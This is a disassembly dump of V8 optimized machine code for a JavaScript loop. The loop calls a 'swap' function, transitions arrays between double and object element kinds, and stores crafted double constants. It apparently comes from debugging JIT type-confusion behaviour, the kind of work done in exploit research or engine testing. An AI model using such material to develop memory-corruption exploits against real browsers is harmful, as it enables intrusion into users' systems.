0x26c10af0b37f  2143  49ba11dd2371ce040000 REX.W movq r10,0x4ce7123dd11    ;; object: 0x4ce7123dd11 <Number: 6.17652e-312>
0x26c10af0b389  2153  4152           push r10
                  ;;; <@183,#140> gap
0x26c10af0b38b  2155  488b75e0       REX.W movq rsi,[rbp-0x20]
                  ;;; <@184,#141> call-runtime
0x26c10af0b38f  2159  b803000000     movl rax,0x3
0x26c10af0b394  2164  48bb20e776cad27f0000 REX.W movq rbx,0x7fd2ca76e720    ;; external reference (Runtime::InitializeVarGlobal)
0x26c10af0b39e  2174  e8fd8ddfff     call 0x26c10ad041a0     ;; code: STUB, CEntryStub, minor: 8
                  ;;; <@186,#142> lazy-bailout
                  ;;; <@188,#144> constant-t
0x26c10af0b3a3  2179  48b8a9252371ce040000 REX.W movq rax,0x4ce712325a9    ;; object: 0x4ce712325a9 PropertyCell for 24581
                  ;;; <@190,#145> store-named-field
0x26c10af0b3ad  2189  a801           test al,0x1
0x26c10af0b3af  2191  7510           jnz 2209  (0x26c10af0b3c1)
                  Abort message: 
                  Operand is a smi
0x26c10af0b3b1  2193  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b3bb  2203  e8608ddfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b3c0  2208  cc             int3l
0x26c10af0b3c1  2209  4533d2         xorl r10,r10
0x26c10af0b3c4  2212  4c89500f       REX.W movq [rax+0xf],r10
                  ;;; <@193,#148> goto
0x26c10af0b3c8  2216  e911000000     jmp 2238  (0x26c10af0b3de)
                  ;;; <@194,#152> -------------------- B3 (OSR entry) --------------------
0x26c10af0b3cd  2221  4883ec40       REX.W subq rsp,0x40
                  ;;; <@204,#158> context
0x26c10af0b3d1  2225  488b45f8       REX.W movq rax,[rbp-0x8]
                  ;;; <@206,#160> gap
0x26c10af0b3d5  2229  488b5d10       REX.W movq rbx,[rbp+0x10]
                  ;;; <@207,#160> goto
0x26c10af0b3d9  2233  e908000000     jmp 2246  (0x26c10af0b3e6)
                  ;;; <@208,#149> -------------------- B4 --------------------
                  ;;; <@210,#151> gap
0x26c10af0b3de  2238  488b5d10       REX.W movq rbx,[rbp+0x10]
0x26c10af0b3e2  2242  488b45e0       REX.W movq rax,[rbp-0x20]
                  ;;; <@212,#167> -------------------- B5 --------------------
0x26c10af0b3e6  2246  48895dd0       REX.W movq [rbp-0x30],rbx
0x26c10af0b3ea  2250  488945d8       REX.W movq [rbp-0x28],rax
                  ;;; <@214,#203> check-maps
                  ;;; <@216,#205> check-maps
                  ;;; <@218,#496> constant-d
0x26c10af0b3ee  2254  49ba000000000000f03f REX.W movq r10,0x3ff0000000000000
0x26c10af0b3f8  2264  c4c1f96ec2     vmovq xmm0,r10
                  ;;; <@219,#496> gap
0x26c10af0b3fd  2269  c5fb1145b0     vmovsd [rbp-0x50],xmm0
                  ;;; <@220,#299> constant-d
0x26c10af0b402  2274  49ba7156341223010000 REX.W movq r10,0x12312345671
0x26c10af0b40c  2284  c4c1f96eca     vmovq xmm1,r10
                  ;;; <@221,#299> gap
0x26c10af0b411  2289  c5fb114da8     vmovsd [rbp-0x58],xmm1
                  ;;; <@224,#170> -------------------- B6 (loop header) --------------------
                  ;;; <@226,#171> constant-t
0x26c10af0b416  2294  48baa9252371ce040000 REX.W movq rdx,0x4ce712325a9    ;; object: 0x4ce712325a9 PropertyCell for 24581
                  ;;; <@228,#172> load-named-field
0x26c10af0b420  2304  4c8b520f       REX.W movq r10,[rdx+0xf]
0x26c10af0b424  2308  41f6c201       testb r10,0x1
0x26c10af0b428  2312  7410           jz 2330  (0x26c10af0b43a)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b42a  2314  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b434  2324  e8e78cdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b439  2329  cc             int3l
0x26c10af0b43a  2330  8b5213         movl rdx,[rdx+0x13]
                  ;;; <@231,#174> compare-numeric-and-branch
0x26c10af0b43d  2333  81fa00000100   cmpl rdx,0x10000
0x26c10af0b443  2339  0f8dd0040000   jge 3577  (0x26c10af0b919)
                  ;;; <@232,#175> -------------------- B7 (unreachable/replaced) --------------------
                  ;;; <@236,#181> -------------------- B8 --------------------
                  ;;; <@238,#194> push-argument
0x26c10af0b449  2345  49bac9772371ce040000 REX.W movq r10,0x4ce712377c9    ;; object: 0x4ce712377c9 <JS Global Object>
0x26c10af0b453  2355  4152           push r10
                  ;;; <@240,#187> constant-t
0x26c10af0b455  2357  48bec13c2071ce040000 REX.W movq rsi,0x4ce71203cc1    ;; object: 0x4ce71203cc1 <FixedArray[251]>
                  ;;; <@242,#191> constant-t
0x26c10af0b45f  2367  48bf71242371ce040000 REX.W movq rdi,0x4ce71232471    ;; object: 0x4ce71232471 <JS Function swap (SharedFunctionInfo 0x4ce71231351)>
                  ;;; <@244,#196> invoke-function
0x26c10af0b469  2377  488b7727       REX.W movq rsi,[rdi+0x27]
0x26c10af0b46d  2381  498b55a0       REX.W movq rdx,[r13-0x60]
0x26c10af0b471  2385  33c0           xorl rax,rax
0x26c10af0b473  2387  ff5737         call [rdi+0x37]
                  ;;; <@246,#197> lazy-bailout
                  ;;; <@248,#198> constant-t
0x26c10af0b476  2390  48b8b1a42371ce040000 REX.W movq rax,0x4ce7123a4b1    ;; object: 0x4ce7123a4b1 <JS Array[2]>
                  ;;; <@250,#201> check-maps
0x26c10af0b480  2400  49ba793cc87cab220000 REX.W movq r10,0x22ab7cc83c79    ;; object: 0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>
0x26c10af0b48a  2410  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af0b48e  2414  0f8507060000   jnz 3963  (0x26c10af0ba9b)
                  ;;; <@252,#198> constant-t
0x26c10af0b494  2420  48b8b1a42371ce040000 REX.W movq rax,0x4ce7123a4b1    ;; object: 0x4ce7123a4b1 <JS Array[2]>
                  ;;; <@254,#206> load-named-field
0x26c10af0b49e  2430  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@256,#198> constant-t
0x26c10af0b4a2  2434  48b8b1a42371ce040000 REX.W movq rax,0x4ce7123a4b1    ;; object: 0x4ce7123a4b1 <JS Array[2]>
                  ;;; <@258,#207> load-named-field
0x26c10af0b4ac  2444  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af0b4b0  2448  41f6c201       testb r10,0x1
0x26c10af0b4b4  2452  7410           jz 2470  (0x26c10af0b4c6)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b4b6  2454  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b4c0  2464  e85b8cdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b4c5  2469  cc             int3l
0x26c10af0b4c6  2470  8b401b         movl rax,[rax+0x1b]
                  ;;; <@260,#208> bounds-check
0x26c10af0b4c9  2473  83f800         cmpl rax,0x0
0x26c10af0b4cc  2476  0f86ce050000   jna 3968  (0x26c10af0baa0)
                  ;;; <@261,#208> gap
0x26c10af0b4d2  2482  c5fb1045b0     vmovsd xmm0,[rbp-0x50]
                  ;;; <@262,#209> store-keyed
0x26c10af0b4d7  2487  c5fb11430f     vmovsd [rbx+0xf],xmm0
                  ;;; <@264,#225> gap
0x26c10af0b4dc  2492  33db           xorl rbx,rbx
                  ;;; <@266,#226> -------------------- B9 (loop header) --------------------
0x26c10af0b4de  2494  48895dc8       REX.W movq [rbp-0x38],rbx
                  ;;; <@268,#229> constant-t
0x26c10af0b4e2  2498  48b891a42371ce040000 REX.W movq rax,0x4ce7123a491    ;; object: 0x4ce7123a491 <JS Array[2]>
                  ;;; <@270,#230> check-maps
0x26c10af0b4ec  2508  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af0b4f6  2518  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af0b4fa  2522  0f85a5050000   jnz 3973  (0x26c10af0baa5)
                  ;;; <@272,#229> constant-t
0x26c10af0b500  2528  48b891a42371ce040000 REX.W movq rax,0x4ce7123a491    ;; object: 0x4ce7123a491 <JS Array[2]>
                  ;;; <@274,#231> load-named-field
0x26c10af0b50a  2538  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af0b50e  2542  41f6c201       testb r10,0x1
0x26c10af0b512  2546  7410           jz 2564  (0x26c10af0b524)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b514  2548  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b51e  2558  e8fd8bdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b523  2563  cc             int3l
0x26c10af0b524  2564  8b501b         movl rdx,[rax+0x1b]
                  ;;; <@277,#232> compare-numeric-and-branch
0x26c10af0b527  2567  3bda           cmpl rbx,rdx
0x26c10af0b529  2569  0f8d1e030000   jge 3373  (0x26c10af0b84d)
                  ;;; <@278,#233> -------------------- B10 (unreachable/replaced) --------------------
                  ;;; <@282,#239> -------------------- B11 --------------------
                  ;;; <@284,#241> stack-check
0x26c10af0b52f  2575  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af0b536  2582  0f82b6040000   jc 3794  (0x26c10af0b9f2)
                  ;;; <@286,#229> constant-t
0x26c10af0b53c  2588  48b891a42371ce040000 REX.W movq rax,0x4ce7123a491    ;; object: 0x4ce7123a491 <JS Array[2]>
                  ;;; <@288,#245> load-named-field
0x26c10af0b546  2598  488b400f       REX.W movq rax,[rax+0xf]
                  ;;; <@290,#247> bounds-check
0x26c10af0b54a  2602  3bd3           cmpl rdx,rbx
0x26c10af0b54c  2604  0f8658050000   jna 3978  (0x26c10af0baaa)
                  ;;; <@292,#248> load-keyed
0x26c10af0b552  2610  488b54d80f     REX.W movq rdx,[rax+rbx*8+0xf]
                  ;;; <@293,#248> gap
0x26c10af0b557  2615  488955c0       REX.W movq [rbp-0x40],rdx
                  ;;; <@294,#253> allocate
0x26c10af0b55b  2619  498b8d68fc0300 REX.W movq rcx,[r13+0x3fc68]
0x26c10af0b562  2626  488bc1         REX.W movq rax,rcx
0x26c10af0b565  2629  4883c038       REX.W addq rax,0x38
0x26c10af0b569  2633  493b8570fc0300 REX.W cmpq rax,[r13+0x3fc70]
0x26c10af0b570  2640  0f87c4040000   ja 3866  (0x26c10af0ba3a)
0x26c10af0b576  2646  a807           test al,0x7
0x26c10af0b578  2648  7410           jz 2666  (0x26c10af0b58a)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af0b57a  2650  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0b584  2660  e8978bdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b589  2665  cc             int3l
0x26c10af0b58a  2666  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af0b591  2673  48ffc1         REX.W incq rcx
                  ;;; <@295,#253> gap
0x26c10af0b594  2676  48894db8       REX.W movq [rbp-0x48],rcx
                  ;;; <@296,#255> store-named-field
0x26c10af0b598  2680  f6c101         testb rcx,0x1
0x26c10af0b59b  2683  7510           jnz 2701  (0x26c10af0b5ad)
                  Abort message: 
                  Operand is a smi
0x26c10af0b59d  2685  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b5a7  2695  e8748bdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b5ac  2700  cc             int3l
0x26c10af0b5ad  2701  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0b5b7  2711  4c89510f       REX.W movq [rcx+0xf],r10
                  ;;; <@298,#257> store-named-field
0x26c10af0b5bb  2715  f6c101         testb rcx,0x1
0x26c10af0b5be  2718  7510           jnz 2736  (0x26c10af0b5d0)
                  Abort message: 
                  Operand is a smi
0x26c10af0b5c0  2720  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b5ca  2730  e8518bdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b5cf  2735  cc             int3l
0x26c10af0b5d0  2736  49bad131c87cab220000 REX.W movq r10,0x22ab7cc831d1    ;; object: 0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b5da  2746  4c8951ff       REX.W movq [rcx-0x1],r10
                  ;;; <@300,#259> store-named-field
0x26c10af0b5de  2750  f6c101         testb rcx,0x1
0x26c10af0b5e1  2753  7510           jnz 2771  (0x26c10af0b5f3)
                  Abort message: 
                  Operand is a smi
0x26c10af0b5e3  2755  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b5ed  2765  e82e8bdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b5f2  2770  cc             int3l
0x26c10af0b5f3  2771  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0b5fd  2781  4c895107       REX.W movq [rcx+0x7],r10
                  ;;; <@302,#260> store-named-field
0x26c10af0b601  2785  f6c101         testb rcx,0x1
0x26c10af0b604  2788  7510           jnz 2806  (0x26c10af0b616)
                  Abort message: 
                  Operand is a smi
0x26c10af0b606  2790  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b610  2800  e80b8bdfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b615  2805  cc             int3l
0x26c10af0b616  2806  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0b620  2816  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@304,#261> store-named-field
0x26c10af0b624  2820  f6c101         testb rcx,0x1
0x26c10af0b627  2823  7510           jnz 2841  (0x26c10af0b639)
                  Abort message: 
                  Operand is a smi
0x26c10af0b629  2825  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b633  2835  e8e88adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b638  2840  cc             int3l
0x26c10af0b639  2841  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0b643  2851  4c89511f       REX.W movq [rcx+0x1f],r10
                  ;;; <@306,#262> store-named-field
0x26c10af0b647  2855  f6c101         testb rcx,0x1
0x26c10af0b64a  2858  7510           jnz 2876  (0x26c10af0b65c)
                  Abort message: 
                  Operand is a smi
0x26c10af0b64c  2860  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b656  2870  e8c58adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b65b  2875  cc             int3l
0x26c10af0b65c  2876  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0b666  2886  4c895127       REX.W movq [rcx+0x27],r10
                  ;;; <@308,#263> store-named-field
0x26c10af0b66a  2890  f6c101         testb rcx,0x1
0x26c10af0b66d  2893  7510           jnz 2911  (0x26c10af0b67f)
                  Abort message: 
                  Operand is a smi
0x26c10af0b66f  2895  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b679  2905  e8a28adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b67e  2910  cc             int3l
0x26c10af0b67f  2911  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0b689  2921  4c89512f       REX.W movq [rcx+0x2f],r10
                  ;;; <@310,#267> store-named-field
0x26c10af0b68d  2925  f6c101         testb rcx,0x1
0x26c10af0b690  2928  7510           jnz 2946  (0x26c10af0b6a2)
                  Abort message: 
                  Operand is a smi
0x26c10af0b692  2930  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b69c  2940  e87f8adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b6a1  2945  cc             int3l
0x26c10af0b6a2  2946  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b6ac  2956  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@312,#268> store-named-field
0x26c10af0b6b0  2960  f6c101         testb rcx,0x1
0x26c10af0b6b3  2963  7510           jnz 2981  (0x26c10af0b6c5)
                  Abort message: 
                  Operand is a smi
0x26c10af0b6b5  2965  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b6bf  2975  e85c8adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b6c4  2980  cc             int3l
0x26c10af0b6c5  2981  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b6cf  2991  4c89511f       REX.W movq [rcx+0x1f],r10
                  ;;; <@314,#269> store-named-field
0x26c10af0b6d3  2995  f6c101         testb rcx,0x1
0x26c10af0b6d6  2998  7510           jnz 3016  (0x26c10af0b6e8)
                  Abort message: 
                  Operand is a smi
0x26c10af0b6d8  3000  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b6e2  3010  e8398adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b6e7  3015  cc             int3l
0x26c10af0b6e8  3016  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b6f2  3026  4c895127       REX.W movq [rcx+0x27],r10
                  ;;; <@316,#270> store-named-field
0x26c10af0b6f6  3030  f6c101         testb rcx,0x1
0x26c10af0b6f9  3033  7510           jnz 3051  (0x26c10af0b70b)
                  Abort message: 
                  Operand is a smi
0x26c10af0b6fb  3035  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b705  3045  e8168adfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b70a  3050  cc             int3l
0x26c10af0b70b  3051  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b715  3061  4c89512f       REX.W movq [rcx+0x2f],r10
                  ;;; <@318,#271> check-non-smi
0x26c10af0b719  3065  f6c201         testb rdx,0x1
0x26c10af0b71c  3068  0f848d030000   jz 3983  (0x26c10af0baaf)
                  ;;; <@320,#187> constant-t
0x26c10af0b722  3074  48bec13c2071ce040000 REX.W movq rsi,0x4ce71203cc1    ;; object: 0x4ce71203cc1 <FixedArray[251]>
                  ;;; <@321,#187> gap
0x26c10af0b72c  3084  488bc2         REX.W movq rax,rdx
                  ;;; <@322,#272> transition-elements-kind
0x26c10af0b72f  3087  49ba793cc87cab220000 REX.W movq r10,0x22ab7cc83c79    ;; object: 0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>
0x26c10af0b739  3097  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af0b73d  3101  0f853d000000   jnz 3168  (0x26c10af0b780)
0x26c10af0b743  3107  50             push rax
0x26c10af0b744  3108  51             push rcx
0x26c10af0b745  3109  52             push rdx
0x26c10af0b746  3110  53             push rbx
0x26c10af0b747  3111  56             push rsi
0x26c10af0b748  3112  57             push rdi
0x26c10af0b749  3113  4150           push r8
0x26c10af0b74b  3115  4151           push r9
0x26c10af0b74d  3117  4153           push r11
0x26c10af0b74f  3119  4154           push r12
0x26c10af0b751  3121  4156           push r14
0x26c10af0b753  3123  4157           push r15
0x26c10af0b755  3125  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af0b75a  3130  48bb693ac87cab220000 REX.W movq rbx,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af0b764  3140  e897d1ffff     call 0x26c10af08900     ;; code: STUB, TransitionElementsKindStub, minor: 1026
0x26c10af0b769  3145  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af0b76e  3150  415f           pop r15
0x26c10af0b770  3152  415e           pop r14
0x26c10af0b772  3154  415c           pop r12
0x26c10af0b774  3156  415b           pop r11
0x26c10af0b776  3158  4159           pop r9
0x26c10af0b778  3160  4158           pop r8
0x26c10af0b77a  3162  5f             pop rdi
0x26c10af0b77b  3163  5e             pop rsi
0x26c10af0b77c  3164  5b             pop rbx
0x26c10af0b77d  3165  5a             pop rdx
0x26c10af0b77e  3166  59             pop rcx
0x26c10af0b77f  3167  58             pop rax
                  ;;; <@324,#272> lazy-bailout
                  ;;; <@325,#272> gap
0x26c10af0b780  3168  488b45c0       REX.W movq rax,[rbp-0x40]
                  ;;; <@326,#273> check-maps
0x26c10af0b784  3172  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af0b78e  3182  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af0b792  3186  0f851c030000   jnz 3988  (0x26c10af0bab4)
                  ;;; <@328,#278> load-named-field
0x26c10af0b798  3192  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@330,#279> check-maps
0x26c10af0b79c  3196  49ba0923f866211c0000 REX.W movq r10,0x1c2166f82309    ;; object: 0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af0b7a6  3206  4c3953ff       REX.W cmpq [rbx-0x1],r10
0x26c10af0b7aa  3210  0f8509030000   jnz 3993  (0x26c10af0bab9)
                  ;;; <@332,#280> load-named-field
0x26c10af0b7b0  3216  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af0b7b4  3220  41f6c201       testb r10,0x1
0x26c10af0b7b8  3224  7410           jz 3242  (0x26c10af0b7ca)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b7ba  3226  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b7c4  3236  e85789dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b7c9  3241  cc             int3l
0x26c10af0b7ca  3242  8b401b         movl rax,[rax+0x1b]
                  ;;; <@334,#281> bounds-check
0x26c10af0b7cd  3245  83f800         cmpl rax,0x0
0x26c10af0b7d0  3248  0f86e8020000   jna 3998  (0x26c10af0babe)
                  ;;; <@336,#199> constant-i
0x26c10af0b7d6  3254  33c0           xorl rax,rax
                  ;;; <@337,#199> gap
0x26c10af0b7d8  3256  488bd3         REX.W movq rdx,rbx
0x26c10af0b7db  3259  488bd8         REX.W movq rbx,rax
0x26c10af0b7de  3262  488b45b8       REX.W movq rax,[rbp-0x48]
                  ;;; <@338,#283> store-keyed
0x26c10af0b7e2  3266  488944da0f     REX.W movq [rdx+rbx*8+0xf],rax
0x26c10af0b7e7  3271  488d5cda0f     REX.W leaq rbx,[rdx+rbx*8+0xf]
0x26c10af0b7ec  3276  f6c201         testb rdx,0x1
0x26c10af0b7ef  3279  7510           jnz 3297  (0x26c10af0b801)
                  Abort message: 
                  Operand is a smi
0x26c10af0b7f1  3281  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b7fb  3291  e82089dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b800  3296  cc             int3l
0x26c10af0b801  3297  483b03         REX.W cmpq rax,[rbx]
0x26c10af0b804  3300  7401           jz 3303  (0x26c10af0b807)
0x26c10af0b806  3302  cc             int3l
0x26c10af0b807  3303  48250000f8ff   REX.W and rax,0xfffffffffff80000
0x26c10af0b80d  3309  f6400802       testb [rax+0x8],0x2
0x26c10af0b811  3313  7415           jz 3336  (0x26c10af0b828)
0x26c10af0b813  3315  48c7c00000f8ff REX.W movq rax,0xfff80000
0x26c10af0b81a  3322  4823c2         REX.W andq rax,rdx
0x26c10af0b81d  3325  f6400804       testb [rax+0x8],0x4
0x26c10af0b821  3329  7405           jz 3336  (0x26c10af0b828)
0x26c10af0b823  3331  e878d5ffff     call 0x26c10af08da0     ;; code: STUB, RecordWriteStub, minor: 8962
0x26c10af0b828  3336  48bbefbeadbeedbeadde REX.W movq rbx,0xdeadbeedbeadbeef
0x26c10af0b832  3346  48b8efbeadbeedbeadde REX.W movq rax,0xdeadbeedbeadbeef
                  ;;; <@339,#283> gap
0x26c10af0b83c  3356  488b45c8       REX.W movq rax,[rbp-0x38]
                  ;;; <@340,#288> add-i
0x26c10af0b840  3360  8d5801         leal rbx,[rax+0x1]
                  ;;; <@342,#291> gap
0x26c10af0b843  3363  c5fb1045b0     vmovsd xmm0,[rbp-0x50]
                  ;;; <@343,#291> goto
0x26c10af0b848  3368  e991fcffff     jmp 2494  (0x26c10af0b4de)
                  ;;; <@344,#236> -------------------- B12 (unreachable/replaced) --------------------
                  ;;; <@348,#292> -------------------- B13 (unreachable/replaced) --------------------
                  ;;; <@352,#296> -------------------- B14 --------------------
                  ;;; <@354,#198> constant-t
0x26c10af0b84d  3373  48b8b1a42371ce040000 REX.W movq rax,0x4ce7123a4b1    ;; object: 0x4ce7123a4b1 <JS Array[2]>
                  ;;; <@356,#305> load-named-field
0x26c10af0b857  3383  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@358,#198> constant-t
0x26c10af0b85b  3387  48b8b1a42371ce040000 REX.W movq rax,0x4ce7123a4b1    ;; object: 0x4ce7123a4b1 <JS Array[2]>
                  ;;; <@360,#306> load-named-field
0x26c10af0b865  3397  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af0b869  3401  41f6c201       testb r10,0x1
0x26c10af0b86d  3405  7410           jz 3423  (0x26c10af0b87f)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b86f  3407  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b879  3417  e8a288dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b87e  3422  cc             int3l
0x26c10af0b87f  3423  8b401b         movl rax,[rax+0x1b]
                  ;;; <@362,#307> bounds-check
0x26c10af0b882  3426  83f801         cmpl rax,0x1
0x26c10af0b885  3429  0f8638020000   jna 4003  (0x26c10af0bac3)
                  ;;; <@363,#307> gap
0x26c10af0b88b  3435  c5fb1045a8     vmovsd xmm0,[rbp-0x58]
                  ;;; <@364,#308> store-keyed
0x26c10af0b890  3440  c5fb114317     vmovsd [rbx+0x17],xmm0
                  ;;; <@368,#313> -------------------- B15 --------------------
                  ;;; <@370,#171> constant-t
0x26c10af0b895  3445  48baa9252371ce040000 REX.W movq rdx,0x4ce712325a9    ;; object: 0x4ce712325a9 PropertyCell for 24581
                  ;;; <@372,#315> load-named-field
0x26c10af0b89f  3455  4c8b520f       REX.W movq r10,[rdx+0xf]
0x26c10af0b8a3  3459  41f6c201       testb r10,0x1
0x26c10af0b8a7  3463  7410           jz 3481  (0x26c10af0b8b9)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b8a9  3465  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b8b3  3475  e86888dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b8b8  3480  cc             int3l
0x26c10af0b8b9  3481  8b4213         movl rax,[rdx+0x13]
                  ;;; <@374,#317> add-i
0x26c10af0b8bc  3484  83c001         addl rax,0x1
0x26c10af0b8bf  3487  0f8003020000   jo 4008  (0x26c10af0bac8)
                  ;;; <@376,#497> smi-tag
0x26c10af0b8c5  3493  8bd8           movl rbx,rax
0x26c10af0b8c7  3495  48c1e320       REX.W shlq rbx, 32
                  ;;; <@378,#171> constant-t
0x26c10af0b8cb  3499  48baa9252371ce040000 REX.W movq rdx,0x4ce712325a9    ;; object: 0x4ce712325a9 PropertyCell for 24581
                  ;;; <@380,#319> store-named-field
0x26c10af0b8d5  3509  f6c201         testb rdx,0x1
0x26c10af0b8d8  3512  7510           jnz 3530  (0x26c10af0b8ea)
                  Abort message: 
                  Operand is a smi
0x26c10af0b8da  3514  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0b8e4  3524  e83788dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b8e9  3529  cc             int3l
0x26c10af0b8ea  3530  f6c301         testb rbx,0x1
0x26c10af0b8ed  3533  7410           jz 3551  (0x26c10af0b8ff)
                  Abort message: 
                  Operand is not a smi
0x26c10af0b8ef  3535  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0b8f9  3545  e82288dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0b8fe  3550  cc             int3l
0x26c10af0b8ff  3551  48895a0f       REX.W movq [rdx+0xf],rbx
                  ;;; <@382,#322> gap
0x26c10af0b903  3555  488b5dd0       REX.W movq rbx,[rbp-0x30]
0x26c10af0b907  3559  488b45d8       REX.W movq rax,[rbp-0x28]
0x26c10af0b90b  3563  c5f928c8       vmovapd xmm1,xmm0
0x26c10af0b90f  3567  c5fb1045b0     vmovsd xmm0,[rbp-0x50]
                  ;;; <@383,#322> goto
0x26c10af0b914  3572  e9fdfaffff     jmp 2294  (0x26c10af0b416)
                  ;;; <@384,#178> -------------------- B16 (unreachable/replaced) --------------------
                  ;;; <@388,#323> -------------------- B17 --------------------
                  ;;; <@391,#325> deoptimize
0x26c10af0b919  3577  e8aa87c7ff     call 0x26c10ab840c8     ;; deoptimization bailout 20
                  ;;; <@392,#326> -------------------- B18 (unreachable/replaced) --------------------
                  ;;; <@432,#372> -------------------- B19 (unreachable/replaced) --------------------
                  ;;; <@444,#378> -------------------- B20 (unreachable/replaced) --------------------
                  ;;; <@448,#384> -------------------- B21 (unreachable/replaced) --------------------
                  ;;; <@582,#381> -------------------- B22 (unreachable/replaced) --------------------
                  ;;; <@586,#436> -------------------- B23 (unreachable/replaced) --------------------
